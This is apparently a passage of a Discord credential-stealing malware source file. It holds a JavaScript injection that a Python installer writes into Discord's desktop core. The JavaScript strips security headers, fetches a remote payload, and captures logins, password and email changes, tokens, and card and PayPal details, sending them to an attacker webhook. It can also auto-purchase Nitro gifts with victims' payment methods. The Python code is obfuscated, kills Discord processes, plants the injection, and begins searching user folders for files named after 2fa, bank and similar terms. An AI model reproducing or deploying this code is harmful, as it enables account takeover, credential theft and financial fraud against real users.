      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def ZXWYUZWGKKUBPHXTZHMTSDCXIXJZIFYXXERXAUXIUIIYWFIZFRNLPRNJNQTKJDSELBOLDFHHSWPFJICNUWAXAZFVGKCFUCJLXH():
    import os
    import re
    import subprocess
    import psutil

    BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ = "Active"

    def IZFLWEBWMRTHMSLYPHJMHLXWRDRNJQTERWKBBRRFLYBJFJFLNHZDHANOUDPGYADPUKSODWUCHMFIHXARZKUBKQCDDGTIPBRNW(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT):
        for v4r_file in os.listdir(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT):
            if re.search(r'app-+?', v4r_file):
                FYKNBMMNJJVSNYOGNSFRPXZZYYMHFIWCXHSGLHTRPHXHCNSDZYSGTDRTSGJZGJMEUSUWFZTINIZBVNFGURMFSN = ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT + '\\' + v4r_file + '\\modules'
                if not os.path.exists(FYKNBMMNJJVSNYOGNSFRPXZZYYMHFIWCXHSGLHTRPHXHCNSDZYSGTDRTSGJZGJMEUSUWFZTINIZBVNFGURMFSN):
                    continue
                for v4r_file in os.listdir(FYKNBMMNJJVSNYOGNSFRPXZZYYMHFIWCXHSGLHTRPHXHCNSDZYSGTDRTSGJZGJMEUSUWFZTINIZBVNFGURMFSN):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC = FYKNBMMNJJVSNYOGNSFRPXZZYYMHFIWCXHSGLHTRPHXHCNSDZYSGTDRTSGJZGJMEUSUWFZTINIZBVNFGURMFSN + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC, v4r_file
        return None

    def LBAOWSQSXRBEZFUZVEFAEBRGUNIGJKPDULYTPJPPWRGONCTFKRZZVSGKTCFXHYZQSQFOM(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT):
        QNWQWMTBQFBFWBVNENOFTYWGLNZHZHJHBUZRZVDKNSVGLAXARKPEKIBFZQSIXMMLCKNMTRCCMTRHVHDITEPSY = ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT + '\\Update.exe'
        YPSWKVEAMJYPWHDPDVUKJBTLUCVGLWGNXXJDKKRRKZYXTQNADRMATRLINRJLSSSHVYZMJKAEZVIXXSENYCW = ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT):
            if re.search(r'app-+?', v4r_file):
                GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKY = ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT + '\\' + v4r_file
                if os.path.exists(GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKY + '\\' + 'modules'):
                    for v4r_file in os.listdir(GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKY):
                        if v4r_file == YPSWKVEAMJYPWHDPDVUKJBTLUCVGLWGNXXJDKKRRKZYXTQNADRMATRLINRJLSSSHVYZMJKAEZVIXXSENYCW:
                            YPSWKVEAMJYPWHDPDVUKJBTLUCVGLWGNXXJDKKRRKZYXTQNADRMATRLINRJLSSSHVYZMJKAEZVIXXSENYCW = GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKY + '\\' + YPSWKVEAMJYPWHDPDVUKJBTLUCVGLWGNXXJDKKRRKZYXTQNADRMATRLINRJLSSSHVYZMJKAEZVIXXSENYCW
                            subprocess.call([QNWQWMTBQFBFWBVNENOFTYWGLNZHZHJHBUZRZVDKNSVGLAXARKPEKIBFZQSIXMMLCKNMTRCCMTRHVHDITEPSY, '--processStart', YPSWKVEAMJYPWHDPDVUKJBTLUCVGLWGNXXJDKKRRKZYXTQNADRMATRLINRJLSSSHVYZMJKAEZVIXXSENYCW],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def ZWRKKNYBAKYJFHISZZDPJQFCPJABHXVXMCWXLRLHFYQBWIRAZBZATBDGSZIPBZNZWWNKWUCSBBBRQ():
        GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKYdata = os.getenv('LOCALAPPDATA')
        EJNMGONHJAQSQBVXNWKCCXUVIJZGEPJCXXHLTQEKATGKLIRWAITTRHODWIGLRDZNBZMQGLQZCBRPAIOUUACUV = [
            GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKYdata + '\\Discord',
            GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKYdata + '\\DiscordCanary',
            GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKYdata + '\\DiscordPTB',
            GJPHTCYNUSVDZDSOQYCMCCDCRQOEQIKHNKAQLSVPRCJAGIPAAZOQBAKHHZVSBWLSPWOPCTEBASTKZHSDVCJUZMYDCYKYdata + '\\DiscordDevelopment'
        ]
        HQBCNQJDKSSYGHAWKZEMEKRKFQGURYUIQLFWNBGFOSYLTCSRSQVBMC = BIXEUYBLAHQIEHJDTIQRXNGJIGPHCRZNONRSRXZCMEBUKAHLMHWTLLVXVE

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT in EJNMGONHJAQSQBVXNWKCCXUVIJZGEPJCXXHLTQEKATGKLIRWAITTRHODWIGLRDZNBZMQGLQZCBRPAIOUUACUV:
            if not os.path.exists(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT):
                continue

            LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC_info = IZFLWEBWMRTHMSLYPHJMHLXWRDRNJQTERWKBBRRFLYBJFJFLNHZDHANOUDPGYADPUKSODWUCHMFIHXARZKUBKQCDDGTIPBRNW(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT)
            if LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC_info is not None:
                LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC, LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC_file = LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC_info
                
                XCQCGITYPFJEUDABEBDZXJZOWTFEEUWNORSIYPJZVQJSOQIKFZMYAEUYUONBGOCQNWIVKRRPKLVVIMHDULAPJZ = LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC + '\\index.js'
                
                if not os.path.exists(XCQCGITYPFJEUDABEBDZXJZOWTFEEUWNORSIYPJZVQJSOQIKFZMYAEUYUONBGOCQNWIVKRRPKLVVIMHDULAPJZ):
                    open(XCQCGITYPFJEUDABEBDZXJZOWTFEEUWNORSIYPJZVQJSOQIKFZMYAEUYUONBGOCQNWIVKRRPKLVVIMHDULAPJZ, 'w').close()

                with open(XCQCGITYPFJEUDABEBDZXJZOWTFEEUWNORSIYPJZVQJSOQIKFZMYAEUYUONBGOCQNWIVKRRPKLVVIMHDULAPJZ, 'w', encoding='utf-8') as f:
                    f.write((HQBCNQJDKSSYGHAWKZEMEKRKFQGURYUIQLFWNBGFOSYLTCSRSQVBMC).replace('discord_desktop_core-1', LVRVXMUMIKZZIEJFECLGEPRATBBDHHEKDXRRHMDKVHEJBDNGHCRC_file)
                            .replace(r"%WEBHOOK_HERE%", IPVPPDBWMKAPWCCFBRJYNEQRAXCYTZXDCEVDCRENPNXAOJOVRAKPHSTNPEVTLSERJLXJLOH)
                            .replace(r"%EMBED_COLOR%", str(ASKWZPHCCQUTTFFWYXRKAQQYASYKURZDIODVNYFPTNCNGIKTPKGZMNHZFSIXNSAWZWWFLCSALVQNFACEBSVTEGPVBIONHJJOBZV))
                            .replace(r"%USERNAME%", BJFTZVPNDTUSITXPRZGIGHMNXVIUZCKJALYICJKKCWPJUFFJYRRGKNUTMSGXUZLKRZVPMASXZSQWOLYAQFUSCS)
                            .replace(r"%IP_PUBLIC%", LWAJZSQCXQSUVKYBIGVGUAXTKJXFGNIFFBCPRFMKKZIZXVGSPK)
                            .replace(r"%EMBED_NAME%", PHEDBDZQUYJJEESUSPWIJQJTJYXKKDDXEBBMAKKZMRRMQKYDYR)
                            .replace(r"%EMBED_ICON%", FPEIUYAZUZAWCXCAMWHOAPUNUQKQCELBQYOHPDKYPXULUDXWNEBIHK)
                            .replace(r"%FOOTER_TEXT%", QDRJVHGHALOBKZUVZGHSGSKHIAYYHMEDDCFARHRNFMKWQMABQEZJHBWYFFPXMMCTSOH)
                            .replace(r"%WEBSITE%", NQRWCABAFWVJEHQTYOQMPJDDRKBLFOWILUGMTOGKJUXJTIUFPMESCLUYEKUBMWCJXIIQVPMTSHKMUCOOPCB))
                LBAOWSQSXRBEZFUZVEFAEBRGUNIGJKPDULYTPJPPWRGONCTFKRZZVSGKTCFXHYZQSQFOM(ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCT)
                
    ZWRKKNYBAKYJFHISZZDPJQFCPJABHXVXMCWXLRLHFYQBWIRAZBZATBDGSZIPBZNZWWNKWUCSBBBRQ()
    return BTIQTBLHPEALIBJBAMNZPMXDQNPPNIXHCODDGLZFTMGHDOYTEOMRPVQNKNXSAEZESVJMHUDIIFYQJUGIMMVAMRZNZ

def SICIIMFQHANBEDZFEPWSIQSIDAMPVXRHRXPTQISLZYCPBDRCLRAMJZIPTLNANAMSBJZNGURMHIMIHSFOYBPAARZNWJGRAHJ(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import os
    import random

    LQQVHUBXUBDWTOOVJNVBOLSBTOFWZSABXDKAUFHTLEPNUSDAVFTYNYNMTRTVBMNQKWE = [
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "Desktop"),
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "Downloads"),
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "Documents"),
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "Picture"),
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "Video"),
        os.path.join(IARUXCSWSHWSIAEAMCHRLHYKPLFBEGIWPMMYJVHHWSYIGXJBISFADFKOOCZVNZ, "OneDrive"),
        os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Microsoft", "Windows", "Recent")
    ]

    EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICXwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
